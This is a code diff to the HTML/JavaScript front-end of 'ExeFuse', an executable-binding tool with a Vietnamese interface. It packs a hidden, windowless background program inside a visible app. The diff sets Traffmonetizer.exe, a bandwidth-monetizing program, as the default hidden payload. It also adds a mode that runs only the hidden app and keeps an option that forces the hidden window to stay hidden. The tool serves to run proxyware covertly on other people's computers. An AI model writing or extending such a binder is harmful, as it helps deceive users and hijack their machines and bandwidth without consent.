@@ -52,6 +52,11 @@ main{flex:1;width:100%;max-width:960px;margin:0 auto;padding:28px 20px 44px}
 }
 .fcard:hover{border-color:var(--accent)}
 .fcard.drag{border-color:var(--accent);background:#0c1f19}
+.fcard.disabled{opacity:.4;pointer-events:none}
+.defnote{
+  display:inline-block;margin-top:10px;font-size:11.5px;color:#a7f3d0;
+  border:1px solid #134e3a;background:#0a1f18;border-radius:99px;padding:3px 10px;
+}
 .fcard .ic{width:30px;height:30px;margin:0 auto 8px;color:var(--muted)}
 .fcard:hover .ic{color:var(--accent2)}
 .fcard h3{margin:0 0 4px;font-size:14px}
@@ -137,16 +142,17 @@ footer{
       <div class="fcard" data-drop="hidden">
         <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"/><line x1="2" x2="22" y1="2" y2="22"/></svg>
         <h3 class="badge-hidden">1 · File chạy NGẦM (bị ẩn)</h3>
-        <div class="sub">Ứng dụng này chạy nền, không hiện cửa sổ, không chiếm taskbar</div>
+        <div class="sub">Ứng dụng này chạy nền, không hiện cửa sổ, không chiếm taskbar<br>Mặc định: <b>Traffmonetizer.exe</b> từ thư mục <b>defaults/</b></div>
         <div class="fname" data-name>Chưa chọn file — bấm hoặc kéo thả .exe vào đây</div>
-        <input type="file" name="hidden_file" accept=".exe" required />
+        <span class="defnote" id="defBadge" hidden>Mặc định sẵn sàng</span>
+        <input type="file" name="hidden_file" accept=".exe" />
       </div>
       <div class="fcard" data-drop="visible">
         <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M10 4v4"/><path d="M2 8h20"/><path d="M6 4v4"/></svg>
         <h3 class="badge-visible">2 · File HIỆN GIAO DIỆN</h3>
         <div class="sub">Ứng dụng chính — cửa sổ sẽ hiện lên bình thường</div>
         <div class="fname" data-name>Chưa chọn file — bấm hoặc kéo thả .exe vào đây</div>
-        <input type="file" name="visible_file" accept=".exe" required />
+        <input type="file" name="visible_file" accept=".exe" />
       </div>
     </div>
 
@@ -155,8 +161,9 @@ footer{
         <label for="outname">Tên file output</label>
         <input type="text" id="outname" name="output_name" placeholder="ExeFuse_App" />
       </div>
-      <label class="check"><input type="checkbox" name="kill_hidden" value="1" checked /> Tắt tiến trình ẩn khi app chính đóng</label>
+      <label class="check"><input type="checkbox" name="kill_hidden" id="killCb" value="1" checked /> Tắt tiến trình ẩn khi app chính đóng</label>
       <label class="check"><input type="checkbox" name="hide_watch" value="1" checked /> Ép ẩn cửa sổ liên tục (phòng app tự mở lại)</label>
+      <label class="check"><input type="checkbox" name="solo_mode" id="soloCb" value="1" /> Chỉ chạy app ẩn — không cần app hiển thị</label>
     </div>
 
     <div class="iconrow">
@@ -205,6 +212,12 @@ const envChips = $('#envChips'), warnbar = $('#warnbar');
 const form = $('#buildForm'), buildBtn = $('#buildBtn'), formErr = $('#formErr');
 const resultCard = $('#resultCard'), statusBadge = $('#statusBadge'), statusHint = $('#statusHint');
 const logEl = $('#log'), downloadBtn = $('#downloadBtn');
+const soloCb = $('#soloCb'), killCb = $('#killCb'), defBadge = $('#defBadge');
+const cardHidden = document.querySelector('[data-drop="hidden"]');
+const cardVisible = document.querySelector('[data-drop="visible"]');
+const hiddenInput = cardHidden.querySelector('input[type=file]');
+const visibleInput = cardVisible.querySelector('input[type=file]');
+let defaultHidden = null; // {name, size_mb, preferred}
 
 const STATUS_TEXT = {
   queued:   ['ĐANG CHỜ', 'Đang chờ vào hàng build...'],
@@ -230,22 +243,59 @@ fetch('/api/env').then(r => r.json()).then(env => {
     warnbar.hidden = false;
     warnbar.innerHTML = 'Cảnh báo: chưa cài <b>PyInstaller</b> — chưa thể build. Mở terminal và chạy <code>pip install pyinstaller</code> rồi tải lại trang.';
   }
+  if (env.default_hidden) {
+    defaultHidden = env.default_hidden;
+    addChip('App ẩn mặc định: ' + defaultHidden.name + ' (' + defaultHidden.size_mb + ' MB)', 'ok');
+    defBadge.hidden = false;
+    defBadge.textContent = 'Mặc định: ' + defaultHidden.name + ' — sẽ dùng nếu không chọn file khác';
+  } else {
+    addChip('App ẩn mặc định: CHƯA CÓ', 'bad');
+    defBadge.hidden = false;
+    defBadge.textContent = 'Chưa có defaults/Traffmonetizer.exe — cần chọn file hoặc thêm file vào defaults/';
+    defBadge.style.color = '#fde68a';
+    defBadge.style.borderColor = '#4d3c10';
+    defBadge.style.background = '#201806';
+  }
+  updateNames();
 }).catch(() => {});
 
 document.querySelectorAll('.fcard').forEach(card => {
   const input = card.querySelector('input[type=file]');
   const nameEl = card.querySelector('[data-name]');
-  const setName = () => {
-    nameEl.textContent = input.files.length ? 'Đã chọn: ' + input.files[0].name : 'Chưa chọn file — bấm hoặc kéo thả .exe vào đây';
-  };
+  input.addEventListener('change', () => { updateNames(); });
   card.addEventListener('click', (e) => { if (e.target !== input) input.click(); });
   card.addEventListener('dragover', (e) => { e.preventDefault(); card.classList.add('drag'); });
   card.addEventListener('dragleave', () => card.classList.remove('drag'));
   card.addEventListener('drop', (e) => {
     e.preventDefault(); card.classList.remove('drag');
-    if (e.dataTransfer.files.length) { input.files = e.dataTransfer.files; setName(); }
+    if (e.dataTransfer.files.length) { input.files = e.dataTransfer.files; updateNames(); }
   });
-  input.addEventListener('change', setName);
+});
+
+function updateNames() {
+  const hiddenName = cardHidden.querySelector('[data-name]');
+  const visibleName = cardVisible.querySelector('[data-name]');
+  if (hiddenInput.files.length) {
+    hiddenName.textContent = 'Đã chọn: ' + hiddenInput.files[0].name + ' (thay thế mặc định)';
+  } else if (defaultHidden) {
+    hiddenName.textContent = 'Dùng mặc định: ' + defaultHidden.name + ' (' + defaultHidden.size_mb + ' MB) từ defaults/';
+  } else {
+    hiddenName.textContent = 'Chưa chọn file — bấm hoặc kéo thả .exe vào đây';
+  }
+  if (visibleInput.files.length) {
+    visibleName.textContent = 'Đã chọn: ' + visibleInput.files[0].name;
+  } else if (soloCb.checked) {
+    visibleName.textContent = 'TẮT — đang ở chế độ chỉ chạy app ẩn';
+  } else {
+    visibleName.textContent = 'Chưa chọn file — bấm hoặc kéo thả .exe vào đây';
+  }
+}
+
+soloCb.addEventListener('change', () => {
+  cardVisible.classList.toggle('disabled', soloCb.checked);
+  killCb.disabled = soloCb.checked;
+  if (soloCb.checked) killCb.checked = false;
+  updateNames();
 });
 
 let pollTimer = null;
@@ -284,7 +334,24 @@ function startPolling(jobId) {
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
   formErr.hidden = true;
+
+  // Validation phia client
+  if (!hiddenInput.files.length && !defaultHidden) {
+    formErr.hidden = false;
+    formErr.textContent = 'Chưa có file chạy ngầm: hãy chọn file .exe, hoặc đặt Traffmonetizer.exe vào thư mục defaults/ rồi tải lại trang.';
+    return;
+  }
+  if (!soloCb.checked && !visibleInput.files.length) {
+    formErr.hidden = false;
+    formErr.textContent = 'Chưa có file hiển thị giao diện: hãy chọn file .exe, hoặc bật chế độ "Chỉ chạy app ẩn".';
+    return;
+  }
+
   const fd = new FormData(form);
+  if (!hiddenInput.files.length && defaultHidden) {
+    fd.append('use_default_hidden', '1');
+  }
+
   buildBtn.disabled = true;
   buildBtn.textContent = 'Đang upload & khởi tạo build...';
   try {
